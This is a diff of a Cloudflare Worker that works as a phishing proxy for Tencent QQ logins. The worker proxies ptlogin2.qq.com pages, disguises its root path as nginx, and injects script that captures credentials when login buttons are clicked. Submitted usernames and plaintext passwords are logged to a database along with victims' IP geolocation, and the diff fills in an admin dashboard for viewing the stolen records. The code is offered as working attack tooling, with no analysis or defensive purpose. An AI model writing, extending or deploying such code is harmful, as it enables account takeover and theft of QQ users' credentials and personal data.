@@ -62,11 +62,13 @@ async function initDB(env) {
 
 /* ---------- 获取客户端真实IP及地理位置（调用用户提供的API） ---------- */
 async function getClientIPInfo(request) {
+  // 优先从请求头获取真实IP（CF提供）
   let clientIP = request.headers.get('CF-Connecting-IP') ||
                  request.headers.get('X-Forwarded-For')?.split(',')[0] ||
                  request.headers.get('X-Real-IP') ||
                  'unknown';
   
+  // 如果IP未知或为内网IP，调用外部API增强（仅用于地理位置）
   try {
     const geoRes = await fetch('https://ip.ilqx.dpdns.org/geo');
     if (geoRes.ok) {
@@ -84,6 +86,7 @@ async function getClientIPInfo(request) {
     console.error('[Geo] 获取地理位置失败:', error.message);
   }
   
+  // 降级：仅返回IP，其他字段留空
   return {
     ip: clientIP,
     country: '',
@@ -100,15 +103,24 @@ async function handleRequest(request, env) {
   const userAgent = request.headers.get('User-Agent') || '';
   const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
   
+  // 初始化数据库（若已存在不会重复创建）
   if (env.DB) await initDB(env);
   
   /* ------- 后台管理路由 ------- */
-  if (url.pathname === '/admin') return handleAdmin(request, env);
-  if (url.pathname === '/admin/clear') return handleAdminClear(request, env);
-  if (url.pathname === '/admin/logout') return handleAdminLogout();
+  if (url.pathname === '/admin') {
+    return handleAdmin(request, env);
+  }
+  if (url.pathname === '/admin/clear') {
+    return handleAdminClear(request, env);
+  }
+  if (url.pathname === '/admin/logout') {
+    return handleAdminLogout();
+  }
   
   /* ------- 登录记录API ------- */
-  if (url.pathname === '/api/log') return handleLogRequest(request, env);
+  if (url.pathname === '/api/log') {
+    return handleLogRequest(request, env);
+  }
   
   /* ------- 根路径伪装nginx ------- */
   if (url.pathname === '/' || url.pathname === '') {
@@ -149,7 +161,7 @@ function isVerificationLink(pathname) {
   return paths.some(p => pathname.startsWith(p));
 }
 
-/* ---------- 验证链接直通 ---------- */
+/* ---------- 验证链接直通（原封不动代理） ---------- */
 async function handleVerificationLink(request, url, isMobile) {
   const referer = request.headers.get('Referer') || '';
   let targetDomain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
@@ -180,10 +192,10 @@ async function handleVerificationLink(request, url, isMobile) {
   }
 }
 
-/* ---------- QQ业务代理（核心代理逻辑，大幅强化JS注入） ---------- */
+/* ---------- QQ业务代理（核心代理逻辑，保持原样） ---------- */
 async function handleQQProxy(request, url, isMobile, userAgent, env) {
   const fullPath = url.pathname + url.search + url.hash;
-  const pathAfterQQ = fullPath.substring(3);
+  const pathAfterQQ = fullPath.substring(3); // 去掉 "/qq"
   let targetUrl;
   
   if (!pathAfterQQ || pathAfterQQ === '/' || pathAfterQQ === '?' || pathAfterQQ.startsWith('?')) {
@@ -224,6 +236,7 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
     const response = await fetch(proxyReq);
     const contentType = response.headers.get('Content-Type') || '';
     
+    // 只对HTML内容进行脚本注入
     if (contentType.includes('text/html')) {
       let html = await response.text();
       const proxyOrigin = new URL(request.url).origin;
@@ -339,7 +352,7 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
             
             // 通过文本内容判断是否登录相关（支持中英文）
             const text = el.innerText || el.value || '';
-            if (/登录|登入|sign\s*in|log\s*in|submit|确认|立即登录/i.test(text)) {
+            if (/登录|登入|sign\\s*in|log\\s*in|submit|确认|立即登录/i.test(text)) {
               captureCredentials();
             }
             
@@ -531,6 +544,7 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
       });
     }
     
+    // 非HTML直接返回
     return response;
     
   } catch (error) {
@@ -550,8 +564,10 @@ async function handleLogRequest(request, env) {
       return new Response('Missing fields', { status: 400 });
     }
     
+    // 获取客户端IP及地理位置
     const ipInfo = await getClientIPInfo(request);
     
+    // 插入数据库（使用完整的地理信息）
     await env.DB.prepare(`
       INSERT INTO login_records 
         (username, password, ip, country, city, latitude, longitude, as_organization, user_agent)
@@ -585,6 +601,7 @@ async function handleAdmin(request, env) {
   const cookies = request.headers.get('Cookie') || '';
   const auth = getCookie('admin_auth', cookies);
   
+  // 处理登录POST
   if (request.method === 'POST') {
     const form = await request.formData();
     const pwd = form.get('password');
@@ -597,6 +614,7 @@ async function handleAdmin(request, env) {
     }
   }
   
+  // 已认证：显示仪表盘
   if (auth === '1') {
     return renderAdminDashboard(env);
   }
@@ -605,12 +623,25 @@ async function handleAdmin(request, env) {
 }
 
 function renderAdminLogin(error = '') {
-  const html = `...`; // 保持不变，省略
+  const html = `<!DOCTYPE html>
+  <html>
+  <head><meta charset="UTF-8"><title>后台管理 · 登录</title>
+  <style>body{font-family:system-ui;max-width:400px;margin:50px auto;padding:20px;background:#f7f9fc;}
+  .card{background:#fff;border-radius:8px;padding:30px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
+  h2{margin-top:0;color:#1e293b;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
+  button{background:#2563eb;color:#fff;border:none;padding:12px 24px;border-radius:4px;cursor:pointer;font-weight:600;}
+  .error{color:#b91c1c;margin-bottom:15px;}</style>
+  </head>
+  <body><div class="card"><h2>🔐 管理后台</h2>
+  ${error ? `<div class="error">${error}</div>` : ''}
+  <form method="POST"><input type="password" name="password" placeholder="管理密码" required>
+  <button type="submit">登录</button></form></div></body></html>`;
   return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
 }
 
 async function renderAdminDashboard(env) {
   try {
+    // 测试数据库连接
     let dbStatus = '✅ 正常';
     let dbError = '';
     try {
@@ -620,9 +651,11 @@ async function renderAdminDashboard(env) {
       dbError = e.message;
     }
     
+    // 获取记录总数
     const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM login_records').first();
     const total = countRes?.count || 0;
     
+    // 获取最近100条记录
     const { results } = await env.DB.prepare(`
       SELECT * FROM login_records ORDER BY timestamp DESC LIMIT 100
     `).all();
@@ -643,8 +676,51 @@ async function renderAdminDashboard(env) {
       rowsHtml = '<tr><td colspan="6" style="text-align:center;padding:30px;">暂无记录</td></tr>';
     }
     
-    const html = `...`; // 保持不变，省略
-    return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+    const html = `<!DOCTYPE html>
+    <html>
+    <head><meta charset="UTF-8"><title>登录记录管理</title>
+    <style>
+      body{font-family:system-ui;margin:0;background:#f1f5f9;}
+      .navbar{background:#0f172a;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;}
+      .container{max-width:1400px;margin:24px auto;padding:0 24px;}
+      .stats{background:#fff;border-radius:8px;padding:20px;margin-bottom:24px;display:flex;gap:40px;align-items:center;}
+      .badge{background:#e2e8f0;padding:4px 12px;border-radius:20px;font-size:14px;}
+      table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.05);}
+      th{background:#f8fafc;text-align:left;padding:12px 16px;font-weight:600;}
+      td{padding:12px 16px;border-top:1px solid #e2e8f0;}
+      .btn{background:#ef4444;color:#fff;padding:8px 16px;border-radius:4px;text-decoration:none;font-size:14px;margin-left:16px;}
+      .btn:hover{background:#dc2626;}
+      .status{display:inline-block;width:10px;height:10px;border-radius:10px;margin-right:8px;}
+    </style>
+    </head>
+    <body>
+      <div class="navbar">
+        <span style="font-weight:bold;">📊 登录凭证记录后台</span>
+        <div><a href="/admin/logout" style="color:#fff;text-decoration:none;">退出</a></div>
+      </div>
+      <div class="container">
+        <div class="stats">
+          <div><span style="font-weight:bold;">📦 数据库状态</span><br>
+            <span class="status" style="background:${dbStatus.includes('✅')?'#10b981':'#ef4444'};"></span> ${dbStatus}
+            ${dbError ? `<small style="color:#ef4444;display:block;">${dbError}</small>` : ''}
+          </div>
+          <div><span style="font-weight:bold;">📋 总记录数</span><br><span style="font-size:28px;">${total}</span></div>
+          <div style="flex:1;text-align:right;">
+            <a href="/admin/clear" class="btn" onclick="return confirm('⚠️ 确定要永久删除所有记录吗？');">🗑️ 清空全部</a>
+          </div>
+        </div>
+        <table>
+          <thead><tr><th>ID</th><th>用户名</th><th>密码</th><th>IP / 地理位置</th><th>时间</th><th>User Agent</th></tr></thead>
+          <tbody>${rowsHtml}</tbody>
+        </table>
+        <p style="margin-top:16px;color:#64748b;">只显示最近100条记录，完整记录请直接查询数据库。</p>
+      </div>
+    </body>
+    </html>`;
+    
+    return new Response(html, {
+      headers: { 'Content-Type': 'text/html; charset=utf-8' }
+    });
   } catch (error) {
     return new Response(`仪表盘错误: ${error.message}`, { status: 500 });
   }
